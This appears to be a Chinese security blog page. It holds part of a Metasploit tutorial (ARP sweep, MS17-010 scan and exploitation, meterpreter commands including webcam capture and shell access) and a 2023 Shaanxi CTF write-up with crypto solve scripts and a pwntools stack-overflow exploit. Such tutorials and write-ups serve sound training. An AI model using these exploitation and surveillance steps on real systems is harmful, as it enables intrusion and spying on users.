<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c段扫描</span><br><span class="line">use auxiliary/scanner/discovery</span><br><span class="line">按TAB键显示都有什么选项</span><br><span class="line">常用的是arp_sweep</span><br><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line"></span><br><span class="line">然后设置目标主机</span><br><span class="line">set rhosts 192.168.123.0/24</span><br><span class="line">然后设置线程什么的</span><br><span class="line">run</span><br><span class="line">就可以扫C段了</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令"></a>msf常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">show exploits:查看所有可用的渗透攻击程序代码</span><br><span class="line">show auxiliary：查看所有可用的辅助攻击工具</span><br><span class="line">show options/advanced：查看该模块的可用选项</span><br><span class="line">show targets：查看该模块适用的攻击目标类型</span><br><span class="line">search：根据关键字搜索某模块</span><br><span class="line">info：显示模块的详细内容</span><br><span class="line">use：使用某个模块</span><br><span class="line">back：回退</span><br><span class="line">set/unset：设置/禁止模块中的某个参数</span><br><span class="line">setg/usetg：设置/禁用适用于所有模块的全局参数      </span><br><span class="line">save：将当前的设置保存下来，以便下次启动MSF终端时仍可以使用</span><br></pre></td></tr></table></figure>







<h2 id="msf攻击获取meterpreter"><a href="#msf攻击获取meterpreter" class="headerlink" title="msf攻击获取meterpreter"></a>msf攻击获取meterpreter</h2><p>ms17_010</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/image-20230517002626452.png" alt="image-20230517002626452"></p>
<p>两个攻击模块两个检测模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">然后</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/image-20230517002935053.png" alt="image-20230517002935053"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置目标机器的地址</span><br><span class="line">set rhosts ip地址（可以使用网段）</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>如果存在漏洞的话就可以利用攻击脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec </span><br><span class="line"></span><br><span class="line">设置目标IP地址</span><br><span class="line">set rhosts IP地址</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line">然后就进去了</span><br><span class="line">meterpreter</span><br><span class="line">然后输入 ？ 回车  会显示操作命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这里如果拿到的不是meterpreter那么可以进行转化</span><br><span class="line">background  进入后台</span><br><span class="line">sessions</span><br><span class="line"></span><br><span class="line">然后输入 sessions 1</span><br><span class="line">进行转换</span><br></pre></td></tr></table></figure>

<h2 id="meterpreter的利用"><a href="#meterpreter的利用" class="headerlink" title="meterpreter的利用"></a>meterpreter的利用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入 ?  查看功能</span><br></pre></td></tr></table></figure>

<p>这里我随便写几个功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">screenshot   截屏</span><br><span class="line">webcam_list  查看摄像头</span><br><span class="line">webcam_snap  通过摄像头拍照</span><br><span class="line">webcam_stream 通过摄像头开启视频</span><br><span class="line">shell        可以进入目标机器的命令行</span><br><span class="line">execute -H -i -f cmd.exe</span><br><span class="line">upload       上传文件  upload /exp.py C:\\exp.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2023陕西省网络安全技能大赛"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/09/2023%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"
    >2023陕西省网络安全技能大赛</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/09/2023%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/" class="article-date">
  <time datetime="2023-06-09T08:28:57.000Z" itemprop="datePublished">2023-06-09</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="奇怪的sar"><a href="#奇怪的sar" class="headerlink" title="奇怪的sar"></a>奇怪的sar</h2><p>首先就是一个lcg，求出seed，seed就是p,q异或的值，还已知n&#x3D;p<em>q,然后找一个已知seed&#x3D;p^q,n&#x3D;p</em>q的脚本分解n，然后RSA得flag</p>
<p>lcg</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/superprintf/article/details/108964563%E4%B8%80%E5%A0%86LCG%E7%9A%84%E8%84%9A%E6%9C%AC">https://blog.csdn.net/superprintf/article/details/108964563一堆LCG的脚本</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">n =  <span class="number">137670797028117726329534659376416493367957852768263083700434198723955223922183386928456013703791817601151754417828367188186912209697081337658512940425529211281290630976671911327606706953154608427885071841566358882014021242768190762103365969320014710368160869517966437591299370072284930202718943785099916898209</span></span><br><span class="line">output =  [<span class="number">101737402423360536260958229788866250367716256968287178187558336481872788309727545478736771692477306412259739856568227009850831432381180909815512654609798228982433082928392936844193974517574281026029228179913579225687286945054175762659252515268270399329404664775893089132101252158524000295899895962104782878103</span>, <span class="number">37355684997487259669354747104430314505839306993101096210478266975184357608742619438151118843905165289324251734149329596611854110739738607745107961453008343886403511257039401245484528985856920723694142989180291902939107642020398816995584650913417698279936585230648639613028793148102494100898288564799111024672</span>, <span class="number">58677759595639211550435023449462812079890625834313820227189340593596480924226619376872336960357021314847975570175387751632125898437020801920862764666175594874885587518469384576361008639967382152477408865298759987606155830674598034578657554841283906976808719095766296677147076808250022898199866472085742989883</span>, <span class="number">61841632061818470036288407041172200048676249787061823756736224887116113640875444187463656719652972233582538657844183320242896612625995507633237074900538692102956750184024574603018257213912795847625926653585010890014291951218199774765624860625726555381815237888483974246173727262881650634287497285246796321130</span>, <span class="number">7618244158597756867387754433401378508070531356170836765779245254233413235386172690733378371343899289510629513166609513857423499004879497768588665836034791151090648182168421570449377835494883902907064269417199065924565304966242954268460876762295575715334403142360198583318323418975108290758222653083011275844</span>, <span class="number">106276841058222138994123556391380518368163552919305398852484130331884811278068151915582752795463570013359693610495645946230044828403849434903415989487924763756589202218361370725532394478569304449884620166937809374355282324069422109879874964479199929174533104879048175102339134830614476339153367475243140156049</span>, <span class="number">54574757236475194407137831004617398270525645136836468973535243574661043352422598443323384197261529289829451787586618886007968913414366545291507686451774653217577858375086817168124727394445167274831801876424578654786480330913650363551771258617533162477541882336257099777912519011890593910515860435759936717781</span>, <span class="number">15567087904962670212229825713697043597876172881256160613623383896576159414077875401117959132252949501643234465895697270909085179587988268864498823765197994781747034644583869111599516151129007414228897958635533561248099927507725880289417298814703767549313482346652043188826434944367260731729064673486516315207</span>, <span class="number">10757138067445225320504771816863593606847219020279502671965413470243269270456133564739090471033889069283122519782525412134604896073598293410977787230108853737796640474070194546344190858079847734817109910030714675258996740807873872365037296486121580542250452443305370358407408558223735250474249180772656905880</span>, <span class="number">68097848963949068260912124852455363245291187860801223898468533992003737157497436432969031551088942445561676359631354280979357356539429863946694570097104716411407829017684705171462511875250672979623888463245258237680782731827727876526411531354910982579164963119481534453651300645314177478026462894232377307020</span>]</span><br><span class="line"></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line">a=(output[<span class="number">2</span>]-output[<span class="number">1</span>])*MMI((output[<span class="number">1</span>]-output[<span class="number">0</span>]),n)%n</span><br><span class="line">ani=MMI(a,n)</span><br><span class="line">b=(output[<span class="number">1</span>]-a*output[<span class="number">0</span>])%n</span><br><span class="line">seed = (ani*(output[<span class="number">0</span>]-b))%n</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br></pre></td></tr></table></figure>

<p>求得seed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">39428646082513135314545544161912595458975375891528176714825766497155482031976852156313956476772023258684487799640179241987139554034654104867011313090105438798561154654679825702410748780286094326639330840289843154525176685892323447168072417654823748596238888125898914210332775882916911771786984574407163323116</span><br></pre></td></tr></table></figure>

<p>然后在GitHub上找分解n的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_cong</span>(<span class="params">k, p, q, n, xored=<span class="literal">None</span></span>):</span><br><span class="line">    kmask = (<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span></span><br><span class="line">    p &amp;= kmask</span><br><span class="line">    q &amp;= kmask</span><br><span class="line">    n &amp;= kmask</span><br><span class="line">    pqm = (p*q) &amp; kmask</span><br><span class="line">    <span class="keyword">return</span> pqm == n <span class="keyword">and</span> (xored <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> (p^q) == (xored &amp; kmask))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">k, a</span>):</span><br><span class="line">    kbit = <span class="number">1</span> &lt;&lt; (k-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> a &lt; kbit</span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    <span class="keyword">yield</span> a | kbit</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">n, p_xor_q</span>):</span><br><span class="line">    tracked = <span class="built_in">set</span>([(p, q) <span class="keyword">for</span> p <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>] <span class="keyword">for</span> q <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">                   <span class="keyword">if</span> check_cong(<span class="number">1</span>, p, q, n, p_xor_q)])</span><br><span class="line"></span><br><span class="line">    PRIME_BITS = <span class="built_in">int</span>(math.ceil(math.log(n, <span class="number">2</span>)/<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    maxtracked = <span class="built_in">len</span>(tracked)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, PRIME_BITS+<span class="number">1</span>):</span><br><span class="line">        newset = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> tp, tq <span class="keyword">in</span> tracked:</span><br><span class="line">            <span class="keyword">for</span> newp_ <span class="keyword">in</span> extend(k, tp):</span><br><span class="line">                <span class="keyword">for</span> newq_ <span class="keyword">in</span> extend(k, tq):</span><br><span class="line">                    <span class="comment"># Remove symmetry</span></span><br><span class="line">                    newp, newq = <span class="built_in">sorted</span>([newp_, newq_])</span><br><span class="line">                    <span class="keyword">if</span> check_cong(k, newp, newq, n, p_xor_q):</span><br><span class="line">                        newset.add((newp, newq))</span><br><span class="line"></span><br><span class="line">        tracked = newset</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tracked) &gt; maxtracked:</span><br><span class="line">            maxtracked = <span class="built_in">len</span>(tracked)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Tracked set size: &#123;&#125; (max=&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(tracked), maxtracked))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># go through the tracked set and pick the correct (p, q)</span></span><br><span class="line">    <span class="keyword">for</span> p, q <span class="keyword">in</span> tracked:</span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span> <span class="keyword">and</span> p*q == n:</span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&#x27;factors were not in tracked set. Is your p^q correct?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    n = <span class="number">24044063028844014127418595700558729326190738802687551098858513077613750188240082663594575453404975706225242363463089392757425008423696150244560748490108425645064339883915929498539109384801415313004805586193044292137299902797522618277016789979196782551492020031695781792205215671106103568559626617762521687128199445018651010056934305055040748892733145467040663073395258760159451903432330506383025685265502086582538667772105057401245864822281535425692919273252955571196166824113519446568745718898654447958192533288063735350717599092500158028352667339959012630051251024677881674246253876293205648190626145653304572328397</span></span><br><span class="line">    seed = <span class="number">39428646082513135314545544161912595458975375891528176714825766497155482031976852156313956476772023258684487799640179241987139554034654104867011313090105438798561154654679825702410748780286094326639330840289843154525176685892323447168072417654823748596238888125898914210332775882916911771786984574407163323116</span></span><br><span class="line">    c = <span class="number">14883053247652228283811442762780942186987432684268901119544211089991663825267989728286381980568977804079766160707988623895155236079459150322336701772385709429870215701045797411519212730389048862111088898917402253368572002593328131895422933030329446097639972123501482601377059155708292321789694103528266681104521268192526745361895856566384239849048923482217529011549596939269967690907738755747213669693953769070736092857407573675987242774763239531688324956444305397953424851627349331117467417542814921554060612622936755420459029769026126293588814831034143264949347763031994934813475762839410192390466491651507733968227</span></span><br><span class="line">    p, q = factor(n, seed)</span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    d=gmpy2.invert(<span class="number">65537</span>,phi)</span><br><span class="line">    m=<span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0u_kn0w_Pruning_and_lcg&#125;</span><br></pre></td></tr></table></figure>



<h2 id="HaM3"><a href="#HaM3" class="headerlink" title="HaM3"></a>HaM3</h2><p>这种题目已经遇到过好多次，这里有一个十分相似的题</p>
<p><a target="_blank" rel="noopener" href="https://blog.cryptohack.org/cryptoctf2021-easy#hamul">https://blog.cryptohack.org/cryptoctf2021-easy#hamul</a></p>
<p>但是这里需要爆破三位</p>
<p>exp1</p>
<p>这个exp是按照<a target="_blank" rel="noopener" href="https://blog.cryptohack.org/cryptoctf2021-easy#hamul%E8%BF%99%E4%B8%AA%E5%86%99%E7%9A%84%EF%BC%8C%E9%80%9F%E5%BA%A6%E5%8D%81%E5%88%86%E7%9A%84%E5%BF%AB">https://blog.cryptohack.org/cryptoctf2021-easy#hamul这个写的，速度十分的快</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">142672086626283587048017713116658568907056287246536918432205313755474498483915485435443731126588499776739329317569276048159601495493064346081295993762052633</span></span><br><span class="line">c = <span class="number">35771468551700967499031290145813826705314774357494021918317304230766070868171631520643911378972522363861624359732252684003796428570328730483253546904382041</span></span><br><span class="line">low = <span class="built_in">str</span>(n)[-<span class="number">18</span>:]</span><br><span class="line">high = <span class="built_in">str</span>(n)[:<span class="number">18</span>]</span><br><span class="line">pq_prob = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment">#爆破</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            pq_prob.append(<span class="built_in">int</span>(high + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j)+ <span class="built_in">str</span>(p)+low))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> pq_prob:</span><br><span class="line">    f = factor(<span class="built_in">int</span>(x))</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(f) == <span class="number">2</span> <span class="keyword">and</span> f[<span class="number">0</span>][<span class="number">0</span>].nbits() == <span class="number">64</span>) :</span><br><span class="line">        p, q = f[<span class="number">0</span>][<span class="number">0</span>], f[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">P = <span class="built_in">int</span>(<span class="built_in">str</span>(p) + <span class="built_in">str</span>(q))</span><br><span class="line">Q = <span class="built_in">int</span>(<span class="built_in">str</span>(q) + <span class="built_in">str</span>(p))</span><br><span class="line">PP = <span class="built_in">int</span>(<span class="built_in">str</span>(P) + <span class="built_in">str</span>(Q))</span><br><span class="line">QQ = <span class="built_in">int</span>(<span class="built_in">str</span>(Q) + <span class="built_in">str</span>(P))</span><br><span class="line">N = PP * QQ</span><br><span class="line"><span class="built_in">print</span>(PP)</span><br><span class="line"><span class="built_in">print</span>(QQ)</span><br><span class="line">phi = (PP-<span class="number">1</span>) * (QQ-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d,PP*QQ)</span><br><span class="line"><span class="built_in">print</span>(N == n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<p>exp2</p>
<p>这个exp是我自己存的这个类型的脚本，但是跑出来的速度慢一点</p>
<p>主要是因为这个脚本每次都要判断x是否能分解，能分解的话还判断是否正确，所以有点慢</p>
<p>上面那个脚本是首先把所有结果存到一个列表里然后进行分解判断，所以速度较快</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">142672086626283587048017713116658568907056287246536918432205313755474498483915485435443731126588499776739329317569276048159601495493064346081295993762052633</span></span><br><span class="line">c = <span class="number">35771468551700967499031290145813826705314774357494021918317304230766070868171631520643911378972522363861624359732252684003796428570328730483253546904382041</span></span><br><span class="line">low = <span class="built_in">str</span>(n)[-<span class="number">18</span>:]</span><br><span class="line">high = <span class="built_in">str</span>(n)[:<span class="number">18</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment">#爆破</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            x=<span class="built_in">int</span>(high + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(j)+ <span class="built_in">str</span>(p)+low)</span><br><span class="line">            f = factor(<span class="built_in">int</span>(x))</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">len</span>(f) == <span class="number">2</span> <span class="keyword">and</span> f[<span class="number">0</span>][<span class="number">0</span>].nbits() == <span class="number">64</span>) :</span><br><span class="line">                p, q = f[<span class="number">0</span>][<span class="number">0</span>], f[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                P = <span class="built_in">int</span>(<span class="built_in">str</span>(p) + <span class="built_in">str</span>(q))</span><br><span class="line">                Q = <span class="built_in">int</span>(<span class="built_in">str</span>(q) + <span class="built_in">str</span>(p))</span><br><span class="line">                PP = <span class="built_in">int</span>(<span class="built_in">str</span>(P) + <span class="built_in">str</span>(Q))</span><br><span class="line">                QQ = <span class="built_in">int</span>(<span class="built_in">str</span>(Q) + <span class="built_in">str</span>(P))</span><br><span class="line">                N = PP * QQ</span><br><span class="line">                <span class="keyword">if</span> N ==n:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">phi = (PP-<span class="number">1</span>) * (QQ-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d,PP*QQ)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;HaMbu2g3r_1S_2ea1ll_D3lci0U3_By_R3A!!&#125;</span><br></pre></td></tr></table></figure>

<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="陕西游玩"><a href="#陕西游玩" class="headerlink" title="陕西游玩"></a>陕西游玩</h2><p>用2的格式化字符串漏洞泄露基地址,绕过pie,用1进行栈溢出,返回shanxi函数的后门</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;pwn1&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;121.196.192.181&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;choice :&quot;</span></span><br><span class="line">p.sendlineafter(key,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;rs\n&quot;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(),<span class="number">16</span>) - <span class="number">0x13a0</span></span><br><span class="line">success(<span class="string">&quot;base--&gt;&quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">p.sendlineafter(key,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(base +<span class="number">0x129a</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后ls,发现有flag,然后cat flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0758fce358ceab884ced023bf80e6bc4&#125;</span><br></pre></td></tr></table></figure>



 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/" rel="tag">2023陕西省赛</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-已知p-q异或和乘积分解n"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/03/%E5%B7%B2%E7%9F%A5p-q%E5%BC%82%E6%88%96%E5%92%8C%E4%B9%98%E7%A7%AF%E5%88%86%E8%A7%A3n/"
    >已知p,q异或和乘积分解n</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
